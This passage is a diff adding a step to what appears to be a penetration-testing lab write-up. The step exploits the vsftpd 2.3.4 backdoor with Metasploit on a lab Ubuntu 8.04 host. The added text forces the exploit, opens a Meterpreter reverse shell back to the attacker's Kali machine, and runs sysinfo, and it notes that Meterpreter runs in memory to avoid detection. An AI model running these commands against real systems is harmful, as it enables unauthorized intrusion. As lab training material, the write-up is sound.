@@ -80,3 +80,37 @@ Commands Explained:
 - set LHOST 192.168.0.139: Defines the Local Host (our attacker/Kali Linux machine IP address) so the target knows where to send the reverse shell connection back.
 
 - show options: Verified again to ensure both RHOSTS and LHOST were updated successfully before executing the exploit.
+
+
+### Step 4: Executing the Exploit & Establishing a Meterpreter Session
+
+After configuring the target and local IP addresses, I disabled the automatic check to force the exploit execution and successfully launched the attack against the target machine.
+
+bash
+- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set AutoCheck false
+- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set ForceExploit true
+- msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+  <img width="1920" height="950" alt="Screenshot_2026-10-17_12_03_49" src="https://github.com/user-attachments/assets/dcd86fce-bce0-4cdf-89be-500cf8d0cd56" />
+
+What is Meterpreter. 
+
+Meterpreter is an advanced, dynamically extensible payload used within the Metasploit Framework. Unlike a standard basic command shell, Meterpreter runs completely in memory (in-the-ram) on the target system, making it harder to detect by traditional security solutions. It provides a feature-rich environment to interact with the compromised system, execute commands, gather system information, and extract files seamlessly.
+
+Exploit Execution & Post-Exploitation Commands:
+
+Triggering the Exploit
+
+The exploit successfully triggered the hidden backdoor vulnerability on port 21.
+
+Spawned a reverse TCP handler and established an active connection back to our Kali Linux machine (192.168.0.139), resulting in: Meterpreter session 1 opened.
+
+Checking System Information
+
+- meterpreter > sysinfo
+
+Purpose: Displays details about the target system.
+
+Observation: Confirmed the target is running an Ubuntu 8.04 server environment with an x86 architecture.
+
+Verifying Privileges (getuid):
